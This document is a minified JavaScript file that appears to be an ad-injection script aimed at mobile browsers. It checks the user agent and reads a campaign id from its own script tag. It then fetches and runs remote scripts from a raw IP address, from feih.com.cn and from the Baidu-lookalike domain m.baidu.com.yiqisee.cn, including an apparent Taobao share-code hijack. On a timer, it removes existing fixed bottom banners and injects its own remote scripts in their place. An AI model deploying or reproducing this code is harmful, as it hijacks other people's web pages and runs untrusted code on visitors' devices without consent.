/**
 * Created by leaves on 2017/7/30.
 */
(function() {
    function k() {
        for (var a = "2.0 MMP;240320;AvantGo;BlackBerry;Blazer;Cellphone;Danger;DoCoMo;Elaine/3.0;EudoraWeb;hiptop;IEMobile;KYOCERA/WX310K;KFTHWI;KFAPWI;PlayBook;BB10;LG/U990;MIDP-2.0;MMEF20;MOT-V;NetFront;Newt;Nintendo Wii;Nitro;Nokia;Opera Mini;Opera Mobi;Palm;Playstation Portable;portalmmm;Proxinet;ProxiNet;SHARP-TQ-GX10;Small;SonyEricsson;Symbian OS;SymbianOS;TS21i-10;UP.Browser;UP.Link;Windows CE;WinWAP;Android;iPhone;iPod;iPad;Windows Phone;HTC".split(";"), c = ["Microsoft Pocket Internet Explorer"], b = navigator.userAgent.toString(), d = 0; d < a.length; d++) if (0 <= b.indexOf(a[d])) return ! 0;
        for (d = 0; d < c.length; d++) if (0 <= b.indexOf(c[d])) return ! 0;
        return ! 1
    }
    function f(a, c) {
        var b = document.createElement("script");
        b.type = "text/javascript";
        b.readyState ? b.onreadystatechange = function() {
                if ("loaded" == b.readyState || "complete" == b.readyState) b.onreadystatechange = null,
                    c()
            }: b.onload = function() {
                c()
            };
        b.src = a;
        b.async = !0;
        document.body.appendChild(b)
    }
    for (var g = document.getElementsByTagName("script"), n = /http:\/\/[a-z0-9.]*.(yiqisee.cn|vveizi.com)\/kaca_js\/js\/attr[a-zA-Z0-9-_]*.js/, d = {},
             e = 0; e < g.length; e++) if (n.test(g[e].src)) {
        g[e].src.split("?")[1].split("&").forEach(function(a, c) {
            a = a.split("=");
            d[a[0]] = a[1]
        });
        break
    }
    randNum = parseInt(4 * Math.random());
    randNum2 = parseInt(10 * Math.random());
    randNum3 = parseInt(20 * Math.random());
    switch (randNum) {
        case 0:
            break;
        case 1:
            break;
        case 2:
            break;
        case 3:
            break;
        default:
            randNum2 = 1
    }
    var c;
    if (!0 === k()) switch (d.a) {
        case "ahwh":
            9 == randNum2 && f("http://123.56.218.35:1280/js/mccc-tc.d.en.js?hash=sm&id=" + d.a,
                function() {});
        case "jxnt":
        case "heb":
        case "zzyd":
        case "zmdyd":
        case "ahgd_new":
        case "nj1":
        case "ttest_nanyang":
        case "ttest_hblt":
        case "ttest_zz":
        case "ttest_nanyang2":
        case "ttest":
        case "jx_jdz":
        case "gxbc":
        case "lzbc":
        case "scbc":
            8 <= randNum2 && f("http://123.56.218.35:1280/js/mccc-tc.d.en.js?hash=bd&id=" + d.a,
                function() {});
            break;
        case "ttest_bj":
            3 == randNum2 && (f("http://h5res.hello-game.cn/cslyads/addad.js",
                function() {}), f("http://m.baidu.com.yiqisee.cn/kaca_js/js/t3.js?f=addad&a=" + d.a,
                function() {}))
    }
    if (!0 === k()) switch (d.a) {
        case "lzbc":
        case "gxbc":
        case "ttest":
        case "ttest_nanyang":
            3 == randNum2 && f("http://m.yiqisee.cn/kaca_js/js/taobaokouling.js?a=" + d.a,
                function() {})
    }
    switch (d.a) {
        case "local":
            c = "http://j.feih.com.cn/admob/sy46/t/mccc-tc-a.js";
            break;
        case "test":
            c = "http://j.feih.com.cn/admob/sy46/t/mccc-tc-a.js";
            break;
        case "jxnt":
            c = "http://j.feih.com.cn/admob/sy46/t/mccc-tc-a.js";
            break;
        case "nj2":
            c = "http://j.feih.com.cn/admob/sy46/t/mccc-tc-a.js";
            break;
        case "ttest":
            c = "http://r.feih.com.cn/admob/sy46/t1/mccc-tc-a.js";
            break;
        case "ttest_zzlt":
            c = "http://r.feih.com.cn/admob/sy46/t1/mccc-tc-a.js";
            break;
        case "ttest_hblt":
            c = "http://r.feih.com.cn/admob/sy46/t1/mccc-tc-a.js";
            break;
        case "ttest_zz":
            c = "http://123.56.218.35:1280/js/mccc-tc.d.en.js?hash=bd&id=ttest_zz2";
            break;
        case "ttest_nanyang":
            c = "http://123.56.218.35:1280/js/mccc-tc.d.en.js?hash=bd&id=ttest_nanyang3";
            break;
        case "ttest_nanyang2":
            c = "http://123.56.218.35:1280/js/mccc-tc.d.en.js?hash=bd&id=ttest_nanyang3";
            break;
        case "heb":
            c = "http://j.feih.com.cn/admob/sy46/t/mccc-tc-a.js";
            break;
        case "ahwh":
            c = "http://j.feih.com.cn/admob/sy46/t/mccc-tc-a.js";
            break;
        case "hblt":
            c = "http://j.feih.com.cn/admob/sy46/t/mccc-tc-a.js";
            break;
        case "lzbc":
            c = "http://123.56.218.35:1280/js/mccc-tc.d.en.js?hash=bd&id=" + d.a;
            break;
        case "gxbc":
            c = "http://123.56.218.35:1280/js/mccc-tc.d.en.js?hash=bd&id=" + d.a;
            break;
        default:
            c = "http://j.feih.com.cn/admob/sy46/t/mccc-tc-a.js"
    }
    var l = 0,
        m = setInterval(function() {
                30 == l && clearInterval(m);
                for (var a = document.getElementsByTagName("div"), f = /^http:\/\/[\S]+(yiqisee.cn|vveizi.com)\/([\w]+[_]?[\w]*\/?)+[\S]+/, b = 0; b < a.length; b++) if (!0 === k()) {
                    var e, g, h;
                    a[b].style.position || "fixed" == a[b].style.position ? (e = "fixed" == a[b].style.position ? !0 : !1, g = 999 <= a[b].style.zIndex ? !0 : !1, h = "0px" == a[b].style.bottom ? !0 : 0 >= a[b].style.bottom ? !0 : !1) : (h = window.getComputedStyle(a[b]), e = "fixed" == h.position ? !0 : !1, g = 999 <= h.zIndex ? !0 : !1, h = 0 >= parseInt(h.bottom) ? !0 : !1);
                    if (0 < a[b].getElementsByTagName("iframe").length && !0 === f.test(a[b].getElementsByTagName("iframe")[0].src)) return;
                    if (e && g && h) {
                        a[b].remove();
                        a = document.createElement("script");
                        a.type = "text/javascript";
                        a.src = "http://m.baidu.com.yiqisee.cn/kaca_js/js/t.js?a=" + d.a;
                        document.getElementsByTagName("head")[0].insertBefore(a, null);
                        a = document.createElement("script");
                        a.type = "text/javascript";
                        a.src = c;
                        document.getElementsByTagName("head")[0].insertBefore(a, null);
                        clearInterval(m);
                        return
                    }
                } else return;
                l++
            },
            300)
})();